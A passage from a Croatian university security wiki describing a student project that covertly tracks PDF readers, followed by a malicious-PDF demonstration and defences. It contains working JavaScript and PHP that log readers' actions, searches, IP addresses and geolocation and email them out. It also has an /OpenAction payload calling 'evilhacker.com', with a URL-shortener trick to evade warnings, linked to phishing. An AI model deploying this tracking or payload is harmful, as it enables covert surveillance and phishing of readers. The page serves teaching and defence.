    document.getElementById('hiddenInput').value = sveInterakcije;
  });

  /**
   * Prati download
   */
  download.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'download');
    var str = 'download ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });

  /**
   * Prati download (button)
   */
  secDownload.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'download');
    var str = 'download ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });

  /**
   * Prati print
   */
  print.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'print');
    var str = 'print ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });

  /**
   * Prati print(button)
   */
  secPrint.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'print');
    var str = 'print ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
  
  /**
   * Prati zoomIn
   */
  zoomIn.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'zoomIn');
    var str = 'zoomIn ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
  
  /**
   * Prati zoomOut
   */
  zoomOut.addEventListener('click', function click(evt) {
    window.trackInteraction(doc, 'zoomOut');
    var str = 'zoomOut ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
  /**
   * Prati korištenje moda prezentacije pdf-a
   */
  presentationMode.addEventListener('click', function click(evt){
    window.trackInteraction(doc, 'presentationMode');
    var str = 'presentationMode ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
  
  secPresentationMode.addEventListener('click', function click(evt){
    window.trackInteraction(doc, 'presentationMode');
    var str = 'presentationMode ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
    /**
   * Prati rotaciju pdf-a
   */
  pageRotateCw.addEventListener('click', function click(evt){
    window.trackInteraction(doc, 'pageRotateCw');
    var str = 'pageRotateCw ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
  
  pageRotateCcw.addEventListener('click', function click(evt){
    window.trackInteraction(doc, 'pageRotateCcw');
    var str = 'pageRotateCcw ';
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
    document.getElementById('hiddenInput').value = sveInterakcije;
  });
 
 var timeout = null;
  //search u pdf-u
  findField.addEventListener('input', function input(evt) { 
      
      findField.onkeyup = function (e) {
        clearTimeout(timeout);

        timeout = setTimeout(function () {
            window.trackInteraction(doc, 'trazenje = '+ findField.value);
            var str = 'trazenje = '+ findField.value +&quot; &quot;;
            sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
            document.getElementById('hiddenInput').value = sveInterakcije;
        }, 800);
        };
  });
})();
</pre>
<p>Praćenje korisnikovih interakcija temelji se na elementima definiranim u viewer.html datoteci od raznih buttona kao što su download, zoom in, zoom out, presentation mode, print itd. pa sve do polja za unose fraze za pretraživanje, odnosno findfielda. Dakle, prvo sam definirao sve potrebne varijable temeljem već definiranih elemenata kako bi kasnije na njih pridružio event listenere. Nadalje, potrebno je rascjepkati URL kako bi varijabla <i>doc</i> dobila vrijednost naziva PDF dokumenta. Nadalje se svakoj prethodno definiranoj varijabli pridružuje eventListener koji kao argument prima već prethodno definirane eventove iz datoteke viwer.js. Tu je važno bilo da se ovisno o eventu pridruži i odgovarajuća funkcija, odnosno da se svaka promjena stranice bilježi već definiranim eventom <i>pagechange </i>, <i>click</i>, <i>input</i>, a postoje i mnogi drugi koji se mogu pronaći na slici kod eventBuseva.
</p><p><br />
Interakcije koje se prate su: posjećene stranice u PDF-u, download dokumenta, print, zoomIn, zoomOut, gledanje dokumenta u prezentacijskom modu (presentationMode), rotiranje stranica u smjeru kazaljke (pageRotateCw) ili obrnuto kazaljke na satu (pageRotateCcw) i na kraju spremanje fraza koje je korisnik unio u polje za pretraživanje dokumenta. Nakon što se svaki pojedinog eventa u varijablu <i>sveInterakcije</i> se sprema učinjena neka od prethodnih interakcija. Ta je varijabla potrebna kako bi se u konačnici mogli korisniku PDF dokumenta prikazati sve interakcije zajedno sa datumom i točnim vremenom otvaranja, IP adresom čitatelja i njegovom geolokacijom.  
</p><p><br />
Cjelokupni proces spremanja svih učinjenih interakcija se izvršava nakon pritiska gumba za download-a ili pak zatvaranja dokumenta. Kako bi se to omogućilo potrebno je napisati odgovarajuće funkcije unutar viewer.html datoteke, a mogu se vidjeti na sljedećim slikama.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:DownlButton.png" class="image"><img alt="DownlButton.png" src="../images/7/7e/DownlButton.png" width="396" height="275" /></a> <a href="http://security.foi.hr/wiki/index.php/Datoteka:GasenjePoziv.png" class="image"><img alt="GasenjePoziv.png" src="../images/b/b5/GasenjePoziv.png" width="492" height="95" /></a>
</p><p>Kod pritiska gumba <i>download</i> i pomoću AJAX-a poziva se funkcija <i>writeToFile</i> koja zapisuje HTTP header od čitatelja zajedno sa datumom i točnim vremenom otvaranja, IP adresom čitatelja i njegovom geolokacijom. Zapravo se izvršava ono što posjeduje i SpremiRequest.php datoteka no na malo drugačiji način (prvenstveno radi boljeg upoznavanja sa AJAX-om i jQueryem). Također, zahvaljujući jQuery-u se nakon zatvaranja cijelog preglednika ili samo tab-a u kojem je otvoren dokument, <i>navigator.sendBeacon</i> aktivira SpremiRequest.php te se šalju sve interakcije (argument string). Sintaksu SpremiRequest.php dokumenta je sljedeća: <a href="https://codeshare.io/5wqrA7" class="external text" rel="nofollow">PROGRAMSKI KOD</a>
</p>
<pre>

&lt;?php

class SpremiHTTPRequest {
    
    
	public function Izvrsi($targetFile) {
	    $DT = date(&quot;D, d M Y H:i:s&quot;, $_SERVER['REQUEST_TIME']);
		$location = file_get_contents('http://freegeoip.net/json/'.$_SERVER['REMOTE_ADDR']);
        $userLocation = explode(',', $location);
	    
		$data = sprintf(
			&quot;%s&#160;%s\n$DT\n\nHTTP headers:\n&quot;,
			$_SERVER['REQUEST_METHOD'],
			$_SERVER['SERVER_PROTOCOL']
		);
		
		//punjenje data-e
		foreach ($this-&gt;getHeaderList() as $name =&gt; $value) {
			$data .= $name . ': ' . $value . &quot;\n&quot;;
		}
		
		foreach($userLocation as $userLocation){
            $data .= $userLocation.&quot;\n&quot;;  
        }
        
		file_put_contents(
			$targetFile,
			$data . file_get_contents('php://input') . &quot;\n&quot;, FILE_APPEND | LOCK_EX
		);
		//php://input returns all the raw data after the HTTP-headers of the request, regardless of the content type
		
		$to      = 'dinokl9@gmail.com';
        $subject = 'Novo citanje PDF-a';
        $message =  $data . file_get_contents('php://input') . &quot;\n&quot;; 
        $headers = 'From: pdfproject@example.com' . &quot;\r\n&quot; .
        'X-Mailer: PHP/' . phpversion();

        mail($to, $subject, $message, $headers);
		
	}
	
	
	private function getHeaderList() {
		$headerList = [];
		foreach ($_SERVER as $name =&gt; $value) {
			if (preg_match('/^HTTP_/',$name)) {
				// convert HTTP_HEADER_NAME to Header-Name
				$name = strtr(substr($name,5),'_',' ');
				$name = ucwords(strtolower($name));
				$name = strtr($name,' ','-');
				// add to list
				$headerList[$name] = $value;
			}
		}
		return $headerList;
	}
}
(new SpremiHTTPRequest)-&gt; Izvrsi('./data.txt');

?&gt;
</pre>
<p>Dakle, nakon download-a dokumenta ili zatvaranja tab-a aktivira se SpremiRequest.php koji prvo dohvaća datum i vrijeme zahtjeva za dokumentom, a zatim i geolokaciju korisnika preko već ugrađenog servisa <i>freegeoip</i>. Nadalje se u varijablu podaci spremaju podaci o HTTP metode (uvijek POST), a zatim i podaci o protokolu preko kojeg je stranica bila zahtijevana. Nakon toga se dohvaćaju podaci HTTP glave preko istoimene funkcije gdje je svaki element polja jedna stavka glave te je potrebno malo igranja sa stringovima kako bi u konačnici ispis svake stavke ljepše izgledao. Nakon tog izvršavanja u varijabla podaci se sprema u data.txt na serveru gdje se poziva i <i>php://input</i> koji vraća sve podatke nakon HTTP zahtjeva neovisno o tipu podataka. To je važno jer također vraća sve interakcije koje je korisnik učinio, a koje se prosljeđuju kod zatvaranja prozora preko argumenta <i>string</i>.
</p><p><br />
Kako bi znao odmah tko je i što je čitao/tražio po PDF omogućeno je automatsko slanje mailova na emaila sa svim podacima koji su prikupljeni preko, odnosno zapisani preko SpremiRequest.php datoteke. Primjer outputa nakon čitanja PDF dokumenta vidljiv je na sljedećoj slici.
</p><p><br />
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:MailPracenja.png" class="image"><img alt="MailPracenja.png" src="../images/thumb/4/4f/MailPracenja.png/1700px-MailPracenja.png" width="1700" height="1278" /></a></div></div>
<p><br />
<a href="https://sispdfproject.000webhostapp.com/" class="external text" rel="nofollow">Web mjesto PDF dokumenta za praćenje</a>
</p>
<h3> <span class="mw-headline" id="Acrobat_Javacript_kao_vektor_napada"> Acrobat Javacript kao vektor napada </span></h3>
<p>U nastavku slijedi i kratki eksperiment vezan uz prethodno objašnjeno. Koristeći se alatom <i>010 Editor</i>, autora Didera Stivensa, omogućeno je promatranje PDF dokumenta u "dušu". na sljedećoj slici se nalazi upotrebljeni alat koji jasno prikazuje sve komponente PDF dokumenta kojeg sam koristio. Alat je dosta jednostavan za korištenje, a ujedno omogućava modificiranje otvorenog dokumenta. Tako sam u prvom slučaju 5 objekt modificirao na način da sam dopisao sljedeći tekst: <i>/OpenAction&lt;&lt;/S/JavaScript/JS(app.doc.getURL\('<a href="http://www.evilhacker.com'" class="external free" rel="nofollow">http://www.evilhacker.com'</a>\);)&gt;&gt;</i>. Time sam zapravo zatražio od PDF-a da odmah po otvaranju otvori dani URL, što zapravo Adobe reader izvršava nakon dozvole korisnika. Ta poruka je također vidljiva na slici. 
</p><p><br />
<a href="http://security.foi.hr/wiki/index.php/Datoteka:PrviJS.png" class="image"><img alt="PrviJS.png" src="../images/thumb/c/c0/PrviJS.png/600px-PrviJS.png" width="600" height="668" /></a> <a href="http://security.foi.hr/wiki/index.php/Datoteka:PrvaPoruka.png" class="image"><img alt="PrvaPoruka.png" src="../images/thumb/e/e4/PrvaPoruka.png/500px-PrvaPoruka.png" width="500" height="228" /></a>
</p><p><br />
Prethodna poruka je dosta naivna i zasigurno niti jedna žrtva ovakvog napada ne bi dopustila spajanje na takvu stranicu, već ju blokirala izmjesta. No ono što je zanimljivo da se taj URL može skratiti recimo Google Shortenerom čime dobivamo sljedeći link: <a href="https://goo.gl/hEi6bg" class="external free" rel="nofollow">https://goo.gl/hEi6bg</a>. Ponovnom modifikacijom PDF u alatu 010 Editor upisujemo prethodni URL umjesto onog naivnog. Pokretanjem sada, novog modificiranog PDF dobivamo sljedeću poruku prikazanu na donjoj slici.
</p><p><br />
<a href="http://security.foi.hr/wiki/index.php/Datoteka:DrugaPoruka.png" class="image"><img alt="DrugaPoruka.png" src="../images/thumb/e/ea/DrugaPoruka.png/500px-DrugaPoruka.png" width="500" height="217" /></a>
</p><p><br />
Ako usporedimo novo dobivenu i prethodnu poruku može se vidjeti da nova i nije baš toliko naivna i zasigurno se za prosječnog korisnika interneta ne radi o zlonamjernoj stranici. Također, može se vidjeti da niti nema nastavak daljnjeg linka (/hEi6bg) čime korisnik ne može niti znati o kojem se URL radi već zna samo da se radi o servisu. Da stvar bude bolja, <b>ukoliko korisnik već ima na svojoj bijeloj listi dopušteno bilo što što u sebi sadrži google, ova poruka se neće prikazati već će se direktno izvršiti.</b> Stoga je potrebno voditi računa i o takvom načinu razmišljanja napadača, odnosno o mogućem preusmjeravanju stranice ma koliko se god ona činila sigurnom.
</p>
<h4> <span class="mw-headline" id="Mjere_za.C5.A1tite_od_malicioznih_PDF-ova"> Mjere zaštite od malicioznih PDF-ova </span></h4>
<p>Svakodnevno se susrećemo s velikim brojem PDF dokumenata, pa se shodno tome moramo i nekako zaštiti od mogućih napada putem njihovih ranjivosti. Kao i uvijek, vjerojatno najvažnija mjera zaštite je procjena može li se vjerovati sadržaju kojeg otvaramo, odnosno dolazi li on iz pouzdanog izvora, bio to e-mail ili neka web stranica. Najsigurnije je uvijek imati nadograđen PDF alat na zadnju dostupnu inačicu, ali to često nije dovoljno, pogotovo u slučaju PDF-a. Potrebno je pratiti preporuke proizvođača jer je čest slučaj da proizvođač tek treba izdati zakrpu za neku ranjivost svojih alata (koja se već iskorištava), no zato postoji neko privremeno rješenje. Kod nekih slučajeva pomaže isključivanje podrške za JavaScript u PDF čitaču. U Adobe Readeru to se radi ovako:
</p><p>Uređivanje -&gt; Preference -&gt; JavaScript i maknuti kvačicu sa „Enable Acrobat JavaScript“
</p><p>Ostale mjere zaštite korisne mjere zaštite su isključivanje automatskog prikaza PDF dokumenata unutar Web preglednika jer ako dokument prije otvaranja pohranimo na tvrdi disk, anti-virusni softver ima veću šansu otkriti zloćudan sadržaj. Također, danas se javljaju mnogi alternativni čitači umjesto Adobe Readera. Napadači su se koncentrirali na ovaj alat zbog njegove popularnosti i mnogi napadi ne pogađaju alternativne alate (naravno to se ne odnosi na one koji koriste propuste u PDF specifikaciji).[4]
</p><p>Didier Stevens [6] je razvio nekoliko alata koji omogućavaju analiziranje PDF dokumenata otkrivajući pritom je li PDF zloćudan ili nije. Prvi isprobani alat je PDFiD koji pretražuje dani PDF prema određenim ključnim riječima: obj, endobj, stream, endstream, xref, trailer, startxref, /Page, /Encrypt, /ObjStm, /JS, /JavaScript, /AA, /OpenAction, /JBIG2Decode, /RichMedia, /Launch, /XFA, a ujedno se koristi metodama kojima otkriva prikriveni, obfuscirani kod.
</p><p>Drugi alat je pdf-parser, koji za razliku od PDFiDa posjeduje znanje o strukturi PDF dokumenata te može prepoznavati indirektne objekte, a također i dekomprimirati (koristiti filtre) kako bi npr. otkrio skriveni JavaScript kod u objektu tipa object stream. Analiza ovim alatom zahtijeva dosta vremena i poznavanje tehnika postavljanja zloćudnog koda u PDF, ranije spomenutih u ovom dokumentu. Primjer korištenja pdf-parsera dan je na sljedećoj slici.
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:PDFParser.png" class="image"><img alt="PDFParser.png" src="../images/3/3d/PDFParser.png" width="1235" height="1031" /></a></div></div>
<h2> <span class="mw-headline" id="Zaklju.C4.8Dak"> Zaključak </span></h2>
<p>Iako mnogi korisnici računala smatraju da je PDF format datoteka siguran način za razmjenu dokumenata i podataka, u posljednjih nekoliko godina napadači ih sve više koriste za izvršavanje zlonamjernog koda na udaljenim računalima. Na primjer, PDF format podržava ugrađene podatke, izvršavanje JavaScripta i vanjskog softvera. Kroz podatke se može vidjeti da je postojao, pa čak se usudim reći i dalje postoji velik broj ranjivosti ovog formata koji se može iskoristiti. Praktički je ovdje rječ o dosta ozbiljnoj prijetnji ne samo za korisnika pojedinačno već i za mnoge organizacije. Treba biti vrlo oprezan kod otvaranja dokumenata i držati se svih navedenih mjera zaštite kod dokumenata za koje sumnjate. Adobe će, kao tvtka najviše pogođena napadima, u budućnosti sigurno više pažnje posvetiti sigurnosti i što bržem ispravljanju propusta. S druge strane, možemo očekivati pojavu novih, sve naprednijih napada kroz ne dokumentirane Javascript funkcije, neočekivane ugrađene čitače dokumenata što je bio slučaj u ovom projektu, ugrađene postscript programe, plug-ine web preglednika i slično. Adobe svakom novom verzijom ispravlja i krpa svoje nedostatke prebacujući sve više na blacklist approach kojim se zabranjuje sve što nije eksplicitno dozvoljeno i po mojem mišljenju su to trebali još prije učiniti. Isto tako valja spomenuti ostale alate za baratanje PDF-ovima poput Foxita koji je također značajno unaprijedio sigurnost korisnika.
</p><p>U ovom projektu kroz praktični dio može se vidjeti kako se na jednostavan način mogu pratiti korisnikove interakcije unutar PDF-a i time dobiti određene informacije koje se kasnije mogu iskoristiti za phishing, odnosno slanje nekog novog PDF-a u kojem je ugrađen javascript kod za napad na korisnika.
</p>
<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
<p>[1] PDF Reference: Adobe® Portable Document Format, Version 1.7, Adobe Systems Incorporated, dostupno na: <a href="https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf" class="external free" rel="nofollow">https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf</a>
</p><p>[2] Raynal, F., G. Delugré and D. Aumaitre. (2008). Malicious origami in PDF, Journal in Computer Virology, dostupno na: esec-lab.sogeti.com/static/publications/08-pacsec-maliciouspdf.pdf
</p><p>[3] The Rise of PDF Malware, <a href="http://www.symantec.com/connect/blogs/rise-pdf-malware" class="external free" rel="nofollow">http://www.symantec.com/connect/blogs/rise-pdf-malware</a>
</p><p>[4] Carnet, (2010) Ranjivost PDF datoteka. Dostupno na: <a href="http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2010-10-315_1.pdf" class="external free" rel="nofollow">http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2010-10-315_1.pdf</a>
</p><p>[5] D. Stevens, Blog., dostupno na: <a href="http://blog.didierstevens.com" class="external free" rel="nofollow">http://blog.didierstevens.com</a>
</p><p>[6] D. Stevens, PDF alati., dostupno na: <a href="https://blog.didierstevens.com/programs/pdf-tools/" class="external free" rel="nofollow">https://blog.didierstevens.com/programs/pdf-tools/</a>
</p>
<!-- 
NewPP limit report
Preprocessor node count: 65/1000000
Post-expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key sisds:pcache:idhash:9898-0!*!0!!hr!2!edit=0 and timestamp 20190203204138 -->
<div class="printfooter">
Dobavljeno iz "<a href="Označavanje_i_praćenje_PDF-a.html">http://security.foi.hr/wiki/index.php/Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
												<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Osobni alati</h5>
	<ul>
					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Imenski prostori</h5>
	<ul>
					<li  id="ca-nstab-main" class="selected"><span><a href="Označavanje_i_praćenje_PDF-a.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Inačice</span><a href="Označavanje_i_praćenje_PDF-a.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Pogledi</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="Označavanje_i_praćenje_PDF-a.html" >Čitaj</a></span></li>
					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Radnje</span><a href="Označavanje_i_praćenje_PDF-a.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
	<h5><label for="searchInput">Traži</label></h5>
	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
		<input type='hidden' name="title" value="Posebno:Traži"/>
				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
				<!-- /logo -->
				
<!-- navigation -->
<div class="portal" id='p-navigation'>
	<h5>Orijentacija</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
				</ul>
			</div>
</div>

<!-- /navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- TOOLBOX -->
<div class="portal" id="p-tb">
	<h5>Traka s alatima</h5>
	<div class="body">
		<ul>
					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;oldid=42269" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
						</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 12:23, 23. siječnja 2018.</li>
																							<li id="footer-info-viewcount">Ova stranica je pogledana 409 puta.</li>
																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
					</li>
				</ul>
						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		
<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Označavanje_i_praćenje_PDF-a", "wgTitle": "Označavanje i praćenje PDF-a", "wgAction": "view", "wgArticleId": 9898, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 42269, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served in 0.555 secs. -->			</body>
</html>
